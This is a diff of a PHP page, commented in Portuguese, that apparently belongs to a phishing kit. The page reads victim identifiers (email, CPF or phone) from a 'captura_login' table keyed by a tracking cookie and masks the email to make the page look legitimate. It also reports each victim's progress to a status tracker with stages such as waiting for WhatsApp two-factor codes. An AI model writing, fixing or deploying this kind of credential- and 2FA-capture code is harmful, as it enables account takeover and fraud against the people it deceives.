@@ -1,57 +1,26 @@
 <?php
 // Inicia a sessão
+
+// =========================================================================
+// PASSO 1: INICIALIZADOR DE SESSÃO (GARANTE QUE O COOKIE SEMPRE EXISTA)
+// Este bloco DEVE ser o primeiro código a ser executado.
+// =========================================================================
 session_start();
 
-// Inclui a conexão com o banco de dados
-require 'db.php';
+$cookie_name = 'identificador_cliente';
+$cookie_lifetime = time() + 3600; // Cookie dura 1 hora
 
-// Prepara variáveis com valores padrão
-$identificador_label = 'Não identificado';
-$identificador_puro = '';
-$tipo_identificador = '';
-$email_mascarado = 'seu e-mail';
-
-// 1. Verifica se o cookie 'identificador_cliente' existe
-if (isset($_COOKIE['identificador_cliente'])) {
-    $session_id = $_COOKIE['identificador_cliente'];
-
-    try {
-        // 2. Busca o identificador mais recente para esta sessão
-        $stmt = $pdo->prepare(
-            "SELECT identificador FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1"
-        );
-        $stmt->execute([$session_id]);
-        $resultado = $stmt->fetch(PDO::FETCH_ASSOC);
-
-        // 3. Se um resultado for encontrado, formata os dados para exibição
-        if ($resultado) {
-            $identificador_puro = $resultado['identificador'];
-            $numeros_identificador = preg_replace('/\D/', '', $identificador_puro);
-
-            if (filter_var($identificador_puro, FILTER_VALIDATE_EMAIL)) {
-                $tipo_identificador = 'email';
-                $identificador_label = htmlspecialchars($identificador_puro);
-                $partes_email = explode('@', $identificador_puro);
-                if (count($partes_email) === 2) {
-                    $dominio = $partes_email[1];
-                    $email_mascarado = '********@' . htmlspecialchars($dominio);
-                }
-            } else {
-                $tipo_identificador = (strlen($numeros_identificador) === 11) ? 'cpf' : 'telefone';
-                $identificador_label = ($tipo_identificador === 'cpf' ? 'CPF: ' : 'Telefone: ') . htmlspecialchars($identificador_puro);
-            }
-        } else {
-            header('Location: index.php');
-            exit;
-        }
-    } catch (PDOException $e) {
-        die("Erro ao consultar o banco de dados: " . $e->getMessage());
-    }
-} else {
-    header('Location: index.php');
-    exit;
+if (!isset($_COOKIE[$cookie_name])) {
+    // Se o cookie NÃO existe, este código o cria com um ID único.
+    $session_value = uniqid('sess_', true); 
+    setcookie($cookie_name, $session_value, $cookie_lifetime, "/");
+    $_COOKIE[$cookie_name] = $session_value; // Disponibiliza para o script atual
 }
+// A partir daqui, o cookie 'identificador_cliente' está 100% garantido.
 
+// =========================================================================
+// PASSO 2: RASTREADOR DE STATUS (AGORA PODE USAR O COOKIE COM SEGURANÇA)
+// =========================================================================
 require_once __DIR__ . '/status_tracker.php';
 
 // Mapa de nomes de arquivos para mensagens de status amigáveis.
@@ -78,13 +47,62 @@ $status_map = [
     'whats2fadesktop.php' => 'Aguardando WhatsApp 2FA (Desktop)',
     'whats2framobile.php' => 'Aguardando WhatsApp 2FA (Mobile)'
 ];
-// Pega o nome do script atual.
+
 $current_page = basename($_SERVER['PHP_SELF']);
-// Verifica se a página atual está no mapa e atualiza o status.
 if (isset($status_map[$current_page])) {
     update_user_status($status_map[$current_page]);
 }
 
+// =========================================================================
+// PASSO 3: LÓGICA ESPECÍFICA DA PÁGINA (EXECUTA NORMALMENTE)
+// =========================================================================
+require_once __DIR__ . '/db.php'; // Inclui a conexão com o banco de dados
+
+// Prepara variáveis com valores padrão
+$identificador_label = 'Não identificado';
+$identificador_puro = '';
+$tipo_identificador = '';
+$email_mascarado = 'seu e-mail';
+
+// Agora podemos usar o cookie sem medo, pois ele foi garantido no Passo 1.
+$session_id = $_COOKIE['identificador_cliente'];
+
+try {
+    // Busca o identificador mais recente para esta sessão
+    $stmt = $pdo->prepare(
+        "SELECT identificador FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1"
+    );
+    $stmt->execute([$session_id]);
+    $resultado = $stmt->fetch(PDO::FETCH_ASSOC);
+
+    // Se um resultado for encontrado, formata os dados para exibição
+    if ($resultado && !empty($resultado['identificador'])) {
+        $identificador_puro = $resultado['identificador'];
+        $numeros_identificador = preg_replace('/\D/', '', $identificador_puro);
+
+        if (filter_var($identificador_puro, FILTER_VALIDATE_EMAIL)) {
+            $tipo_identificador = 'email';
+            $identificador_label = htmlspecialchars($identificador_puro);
+            $partes_email = explode('@', $identificador_puro);
+            if (count($partes_email) === 2) {
+                $dominio = $partes_email[1];
+                $email_mascarado = '********@' . htmlspecialchars($dominio);
+            }
+        } else {
+            $tipo_identificador = (strlen($numeros_identificador) === 11) ? 'cpf' : 'telefone';
+            $identificador_label = ($tipo_identificador === 'cpf' ? 'CPF: ' : 'Telefone: ') . htmlspecialchars($identificador_puro);
+        }
+    } else {
+        // Se mesmo com um cookie válido não acharmos o registro, algo está errado.
+        // Redirecionar para o início é uma boa medida de segurança.
+        header('Location: index.php');
+        exit;
+    }
+} catch (PDOException $e) {
+    die("Erro ao consultar o banco de dados: " . $e->getMessage());
+}
+
+// O resto da sua página HTML continua aqui embaixo...
 ?>
 <!DOCTYPE html>
 <html lang="pt-BR">
